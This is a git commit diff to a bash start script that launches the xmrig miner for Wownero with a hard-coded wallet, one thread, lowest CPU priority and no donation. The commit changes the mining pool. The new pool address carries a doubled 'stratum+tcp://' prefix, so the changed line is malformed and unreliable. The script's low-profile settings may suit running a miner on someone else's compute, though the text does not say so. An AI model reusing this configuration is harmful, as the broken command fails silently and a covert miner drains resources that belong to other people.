b72139da6bf9a5af5cca5c69274622563738797d
Zelticu <Zelticue@gmail.com>
2025-07-15 20:44:20 -0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 cd /app
 ./xmrig/xmrig \
- -o stratum+tcp://wownero.ingest.cryptoknight.cc:3333 \
+ -o stratum+tcp://stratum+tcp://wownero.herominers.com:1117 \
  -u Wo4eVYJsXWT8w8sArwpGUKLQib45J5x2nMgEnjSBw9iWCDhXf64KXtV5oNhRwAokNtfUw1AM9ekoi12SAM8R7C3A1GK2UiDvv \
  -p x --coin wownero --threads 1 --cpu-priority 0 --donate-level 0
